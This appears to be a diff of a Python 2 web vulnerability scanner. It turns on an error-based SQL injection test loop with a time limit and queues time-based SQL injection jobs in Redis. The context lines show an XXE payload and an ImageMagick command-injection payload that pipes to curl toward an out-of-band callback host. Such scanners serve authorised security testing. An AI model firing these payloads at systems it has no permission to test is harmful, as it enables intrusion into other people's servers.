@@ -90,6 +90,7 @@ XXE_Role = '<?xml version="1.0" encoding="utf-8"?>\n\n<!DOCTYPE r [\n\n<!ENTITY 
 ImageMagick_Rule = 'push graphic-context\nviewbox 0 0 640 480\nimage copy 200,200 100,100 "|curl http://imagemagick_{domain}.devil.yoyostay.top"\npop graphic-context'
 
 
+
 # 文件包含规则
 
 
@@ -198,6 +199,7 @@ def checkRepeat(host, method, no_repeat=None):
 def start_point(args):
     dict_links = getLinks(args.file)
     # sys.exit(0)
+    redis_conn = RedisUtil(REDIS_DB, REDIS_HOST, REDIS_PASSWORD)
     HTTPQUEUE = Queue()
     for index in dict_links:
         url = dict_links[index]['url']
@@ -241,36 +243,46 @@ def start_point(args):
             print "User killed"
             break
 
-    # for index in dict_links.keys():
-    #     item = dict_links[index]
-    #     url = item['url']
-    #     headers = item['headers']
-    #     data = item['data'] if 'data' in item else None
-    #     try:
-    #         time_result = SQLInjectionTime(url, headers=headers, data=data).startTest()
-    #         if time_result:
-    #             outqueue.put(('SQLInjection Time', 'awvs', url))
-    #     except Exception as e:
-    #         continue
+    for index in dict_links.keys():
+        item = dict_links[index]
+        redis_conn.task_push(SQLI_TIME_QUEUE, json.dumps(item))
+        # url = item['url']
+        # headers = item['headers']
+        # data = item['data'] if 'data' in item else None
+        # try:
+        #     time_result = SQLInjectionTime(url, headers=headers, data=data).startTest()
+        #     if time_result:
+        #         outqueue.put(('SQLInjection Time', 'awvs', url))
+        # except KeyboardInterrupt:
+        #     break
+        # except Exception as e:
+        #     continue
 
 
-
-    # for index in dict_links.keys():
-    #     item = dict_links[index]
-    #     url = item['url']
-    #     headers = item['headers']
-    #     data = item['data'] if 'data' in item else None
-    #     time.sleep(3)
-    #     aim_error_list = sqli_test(url, headers, data)
-    #     for i in aim_error_list:
-    #         print "[+] [{}]:\t".format(i[0]) + Fore.GREEN + "Found SQLi Error-Based Injection=> url:{} =>data:{}".format(i[1], i[2])  + Style.RESET_ALL
+    start_time = time.time()
+    for index in dict_links.keys():
+        if time.time() - start_time > args.limit * 60:
+            break
+        try:
+            item = dict_links[index]
+            url = item['url']
+            headers = item['headers']
+            data = item['data'] if 'data' in item else None
+            time.sleep(3)
+            aim_error_list = sqli_test(url, headers, data)
+            for i in aim_error_list:
+                print "[+] [{}]:\t".format(i[0]) + Fore.GREEN + "Found SQLi Error-Based Injection=> url:{} =>data:{}".format(i[1], i[2])  + Style.RESET_ALL
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            logger.error("sql error test errror: {}".format(repr(e)))
 
 
 
 
     while not outqueue.empty():
         a = outqueue.get()
-        print "[++++++]" + Fore.GREEN + "[{}]\n        ".format(a[0]) + Fore.YELLOW + "[{}]\n        ".format(a[1]) + Fore.RED + a[2] + Style.RESET_ALL
+        logger.info("[++++++]" + Fore.GREEN + "[{}]\n        ".format(a[0]) + Fore.YELLOW + "[{}]\n        ".format(a[1]) + Fore.RED + a[2] + Style.RESET_ALL)
 
 
 
